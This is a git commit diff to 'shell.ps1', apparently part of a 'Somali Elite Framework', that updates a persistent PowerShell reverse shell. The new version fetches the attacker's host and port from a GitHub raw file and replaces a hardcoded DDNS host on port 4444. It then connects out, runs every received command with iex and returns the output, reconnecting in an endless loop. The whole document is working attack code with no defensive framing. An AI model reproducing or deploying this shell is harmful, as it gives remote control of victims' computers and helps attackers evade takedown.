4ded46d451d85899000eb76a4f9ede80af7458bf
KHAPIIP <127144266+KHAPIIP@users.noreply.github.com>
2026-05-07 22:10:58 -0800

    Update shell.ps1

--- shell.ps1
+++ shell.ps1
@@ -1,15 +1,14 @@
-# Somali Elite Framework - Stubborn Global Shell
-# Author: Eng Khapiip
-
-$HOST_NAME = "khapiip-elite.ddns.net" 
-$PORT = 4444
+# Somali Elite Framework - Stubborn Shell
+$CONN_URL = "https://raw.githubusercontent.com/KHAPIIP/Somali-Elite-Framework/main/connection.txt"
 
 while($true) {
     try {
-        # Isku day inuu ku xirmo No-IP-gaaga
+        $RAW_DATA = (New-Object Net.WebClient).DownloadString($CONN_URL).Trim()
+        $HOST_NAME = $RAW_DATA.Split(":")[0]
+        $PORT = $RAW_DATA.Split(":")[1]
+
         $c = New-Object System.Net.Sockets.TCPClient($HOST_NAME, $PORT)
         $s = $c.GetStream(); [byte[]]$b = 0..65535|% {0}
-        
         while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
             $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i)
             $sb = (iex $d 2>&1 | Out-String )
@@ -18,8 +17,5 @@ while($true) {
             $s.Write($x, 0, $x.Length); $s.Flush()
         }
         $c.Close()
-    } catch {
-        # Haddii uu xiriirku go'o ama IP-gaagu isbeddelo, 5s sug ka dibna dib u raadi No-IP-ga
-        Start-Sleep -Seconds 5
-    }
+    } catch { Start-Sleep -Seconds 10 }
 }
